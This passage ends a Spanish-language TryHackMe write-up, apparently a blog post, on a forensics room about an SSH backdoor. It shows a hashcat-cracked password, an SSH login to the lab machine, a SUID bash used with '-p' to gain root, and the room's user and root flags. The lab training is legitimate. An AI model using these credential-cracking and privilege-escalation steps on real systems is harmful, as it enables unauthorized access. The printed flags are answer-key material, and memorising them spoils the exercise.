+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">67</span>   │ Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">68</span>   │ Progress.........: 4980736/14344385 <span style="color:#f92672">(</span>34.72%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">69</span>   │ Rejected.........: 0/4980736 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">70</span>   │ Restore.Point....: 0/14344385 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">71</span>   │ Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">72</span>   │ Candidate.Engine.: Device Generator
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">73</span>   │ Candidates.#1....: <span style="color:#ae81ff">123456</span> -&gt; nuquni89yHt
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">74</span>   │ Hardware.Mon.#1..: Temp: 40c Fan:  0% Util: 31% Core:2505MHz Mem:10802MHz Bus:16
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">75</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">76</span>   │ Started: Sun Sep  <span style="color:#ae81ff">3</span> 18:38:02 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">77</span>   │ Stopped: Sun Sep  <span style="color:#ae81ff">3</span> 18:38:10 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">78</span>   │                                                                                                                                                                                 
+</span></span><span style="display:flex;"><span>       │          
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">79</span>   │ ❯ cat output.txt
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">80</span>   │ ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>       │ ─────────
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">81</span>   │        │ File: output.txt
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">82</span>   │ ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>       │ ─────────
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">83</span>   │    <span style="color:#ae81ff">1</span>   │ 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:novem
+</span></span><span style="display:flex;"><span>       │ ber16
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">84</span>   │ ───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>       │ ─────────
+</span></span></code></pre></div><ul>
+<li>La contraseña es <strong>november16</strong></li>
+</ul>
+<h2 id="task-3---attack---get-back-in">Task 3 - Attack - Get back in!</h2>
+<h3 id="paso-6">Paso 6</h3>
+<ul>
+<li>El atacante dejó su firma en la web, al acceder se puede leer <strong>H4ck3d by CooctusClan</strong></li>
+<li>Usando la informacion recopilada, accedo por SSH, aprovecho el SUID de un binario y consigo acceso privilegiado con una vulnerabilidad que indica GTOFbins.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>       │ File: ssh
+</span></span><span style="display:flex;"><span>───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   │ ❯ ssh -oHostKeyAlgorithms<span style="color:#f92672">=</span>+ssh-rsa james@10.10.55.155 -p <span style="color:#ae81ff">2222</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>   │ The authenticity of host <span style="color:#e6db74">&#39;[10.10.55.155]:2222 ([10.10.55.155]:2222)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   3   │ RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   4   │ This key is not known by any other names.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   5   │ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   6   │ Warning: Permanently added &#39;</span><span style="color:#f92672">[</span>10.10.55.155<span style="color:#f92672">]</span>:2222<span style="color:#e6db74">&#39; (RSA) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   7   │ james@10.10.55.155&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">8</span>   │ To run a command as administrator <span style="color:#f92672">(</span>user <span style="color:#e6db74">&#34;root&#34;</span><span style="color:#f92672">)</span>, use <span style="color:#e6db74">&#34;sudo &lt;command&gt;&#34;</span>.
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">9</span>   │ See <span style="color:#e6db74">&#34;man sudo_root&#34;</span> <span style="color:#66d9ef">for</span> details.
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">10</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">11</span>   │ james@overpass-production:/home/james/ssh-backdoor$ ll
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">12</span>   │ total <span style="color:#ae81ff">6584</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">13</span>   │ drwxrwxr-x <span style="color:#ae81ff">3</span> james james    <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2020</span> ./
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">14</span>   │ drwxr-xr-x <span style="color:#ae81ff">7</span> james james    <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2020</span> ../
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">15</span>   │ drwxrwxr-x <span style="color:#ae81ff">8</span> james james    <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> .git/
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">16</span>   │ -rw-rw-r-- <span style="color:#ae81ff">1</span> james james     <span style="color:#ae81ff">109</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> README.md
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">17</span>   │ -rwxrwxr-x <span style="color:#ae81ff">1</span> james james <span style="color:#ae81ff">6634961</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> backdoor*
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">18</span>   │ -rw-rw-r-- <span style="color:#ae81ff">1</span> james james     <span style="color:#ae81ff">362</span> Jul <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2020</span> backdoor.service
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">19</span>   │ -rw-rw-r-- <span style="color:#ae81ff">1</span> james james     <span style="color:#ae81ff">104</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> build.sh
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">20</span>   │ -rw-rw-r-- <span style="color:#ae81ff">1</span> james james   <span style="color:#ae81ff">60102</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> cooctus.png
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">21</span>   │ -rw------- <span style="color:#ae81ff">1</span> james james    <span style="color:#ae81ff">1679</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> id_rsa
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">22</span>   │ -rw-r--r-- <span style="color:#ae81ff">1</span> james james     <span style="color:#ae81ff">407</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> id_rsa.pub
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">23</span>   │ -rw-rw-r-- <span style="color:#ae81ff">1</span> james james     <span style="color:#ae81ff">815</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> index.html
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">24</span>   │ -rw-rw-r-- <span style="color:#ae81ff">1</span> james james    <span style="color:#ae81ff">2788</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> main.go
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">25</span>   │ -rw-rw-r-- <span style="color:#ae81ff">1</span> james james     <span style="color:#ae81ff">241</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> setup.sh
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">26</span>   │ james@overpass-production:/home/james/ssh-backdoor$ cd                         
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">27</span>   │ bash: cd: HOME not set
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">28</span>   │ james@overpass-production:/home/james/ssh-backdoor$ cd /home/james             
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">29</span>   │ james@overpass-production:/home/james$ ll                                      
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">30</span>   │ total <span style="color:#ae81ff">1136</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">31</span>   │ drwxr-xr-x <span style="color:#ae81ff">7</span> james james    <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2020</span> ./
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">32</span>   │ drwxr-xr-x <span style="color:#ae81ff">7</span> root  root     <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> ../
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">33</span>   │ lrwxrwxrwx <span style="color:#ae81ff">1</span> james james       <span style="color:#ae81ff">9</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">34</span>   │ -rw-r--r-- <span style="color:#ae81ff">1</span> james james     <span style="color:#ae81ff">220</span> Apr  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2018</span> .bash_logout
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">35</span>   │ -rw-r--r-- <span style="color:#ae81ff">1</span> james james    <span style="color:#ae81ff">3771</span> Apr  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2018</span> .bashrc
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">36</span>   │ drwx------ <span style="color:#ae81ff">2</span> james james    <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> .cache/
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">37</span>   │ drwx------ <span style="color:#ae81ff">3</span> james james    <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> .gnupg/
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">38</span>   │ drwxrwxr-x <span style="color:#ae81ff">3</span> james james    <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2020</span> .local/
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">39</span>   │ -rw------- <span style="color:#ae81ff">1</span> james james      <span style="color:#ae81ff">51</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> .overpass
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">40</span>   │ -rw-r--r-- <span style="color:#ae81ff">1</span> james james     <span style="color:#ae81ff">807</span> Apr  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2018</span> .profile
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">41</span>   │ -rw-r--r-- <span style="color:#ae81ff">1</span> james james       <span style="color:#ae81ff">0</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> .sudo_as_admin_successful
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">42</span>   │ -rwsr-sr-x <span style="color:#ae81ff">1</span> root  root  <span style="color:#ae81ff">1113504</span> Jul <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2020</span> .suid_bash*
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">43</span>   │ drwxrwxr-x <span style="color:#ae81ff">3</span> james james    <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2020</span> ssh-backdoor/
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">44</span>   │ -rw-rw-r-- <span style="color:#ae81ff">1</span> james james      <span style="color:#ae81ff">38</span> Jul <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2020</span> user.txt
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">45</span>   │ drwxrwxr-x <span style="color:#ae81ff">7</span> james james    <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2020</span> www/
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">46</span>   │ james@overpass-production:/home/james$ cat user.txt                            
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">47</span>   │ thm<span style="color:#f92672">{</span>d119b4fa8c497ddb0525f7ad200e6567<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">48</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">49</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">50</span>   │ james@overpass-production:/home$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null         
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">51</span>   │ /usr/bin/chsh
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">52</span>   │ /usr/bin/sudo
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">53</span>   │ /usr/bin/chfn
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">54</span>   │ /usr/bin/pkexec
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">55</span>   │ /usr/bin/traceroute6.iputils
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">56</span>   │ /usr/bin/newuidmap
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">57</span>   │ /usr/bin/newgidmap
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">58</span>   │ /usr/bin/passwd
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">59</span>   │ /usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">60</span>   │ /usr/bin/at
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">61</span>   │ /usr/bin/newgrp
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">62</span>   │ /usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">63</span>   │ /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">64</span>   │ /usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">65</span>   │ /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">66</span>   │ /usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">67</span>   │ /bin/mount
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">68</span>   │ /bin/fusermount
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">69</span>   │ /bin/su
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">70</span>   │ /bin/ping
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">71</span>   │ /bin/umount
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">72</span>   │ /home/james/.suid_bash
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">73</span>   │ james@overpass-production:/home$     
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">74</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">75</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">76</span>   │ james@overpass-production:/home$ /home/james/.suid_bash -p                     
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">77</span>   │ .suid_bash-4.4# whoami
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">78</span>   │ root
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">79</span>   │ .suid_bash-4.4# 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">80</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">81</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">82</span>   │ .suid_bash-4.4# cd /root
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">83</span>   │ .suid_bash-4.4# ls
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">84</span>   │ root.txt
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">85</span>   │ .suid_bash-4.4# cat root.txt
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">86</span>   │ thm<span style="color:#f92672">{</span>d53b2684f169360bb9606c333873144d<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>END<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>El enfoque de esta maquina era distinto a las otras, presentando un reto desde el punto de vista de un analista de seguridad en un SOC. Mediante el analisis del tráfico de red se ha podido averiguar que tipo de ataque se ha llevado a cabo por parte de los atacantes, y hemos podido usar dicha información para tomar el control del equipo vulnerado y restablecerlo.</p>
+<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
+</div>
+</article>
+
+    
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/forensics">#forensics</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/gtofbins">#GTOFbins</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/hashcat">#hashcat</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/johntheripper">#johntheripper</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/linux">#Linux</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/medium">#medium</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/network">#network</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/pcapng">#pcapng</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/ssh-backdoor">#ssh-backdoor</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/suid">#SUID</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/tryhackme">#TryHackMe</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/wireshark">#wireshark</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+
+<p><small>
+        2023 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
